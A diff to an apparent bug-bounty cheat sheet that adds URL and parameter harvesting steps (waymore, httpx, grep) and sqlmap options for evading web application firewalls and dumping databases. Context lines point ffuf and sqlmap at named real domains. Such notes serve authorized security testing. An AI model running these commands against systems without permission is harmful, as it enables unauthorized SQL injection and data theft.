@@ -75,10 +75,33 @@ ffuf -u https://www.workramp.com/FUZZ -w wordlist.txt -mc 200,403,301,302 -c tru
 
 - subzy run --target test.google.com,https://test.yahoo.com
 
+------------------------------------------------------------------------------------
+## collecting urls and Parameters :-
+
+#Getting urls :- waymore tool (Mazing tool collecting urls from different resources)
+
+Basic Usage:-
+
+waymore -i example.com -mode U -oU result.txt
 
 
+cat result.txt | sort -u > sorted.txt
 
 
+#Getting live urls :-
+
+cat sorted.txt | httpx -mc 200 -o live-urls.txt
+
+
+#Getting parameters from live urls :-
+
+cat live-urls.txt | grep "=" > live-parameters.txt
+
+(live-parameters.txt) Ready for testing.
+
+
+waymore tool link :-
+https://github.com/xnl-h4ck3r/waymore
 __________________________________________________________________________________________________
 
 ## virtual Host scanner :-
@@ -233,6 +256,28 @@ ________________________________________________________________________________
 
 
 - sqlmap -u https://my.easyname.at/en/login --dbs --forms --crawl=2
+
+
+# Waf Bypass techniques Using Sqlmap :-
+
+--dbs --level=5 --risk=3 --user-agent -v3 --tamper="between,randomcase,space2comment" --batch --dump
+
+
+--tamper=space2comment --level=5 --risk=3
+
+
+--technique=B
+
+
+--level=5 --risk=3 --random-agent --user-agent -v3 --batch --threads=10 --dbs
+
+
+--random-agent --dbms=MYSQL --dbs --technique=B
+
+-v3 --technique=T --no-cast --fresh-queries --banner
+
+
+tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
 
 
 ## SQLi One Linear :-
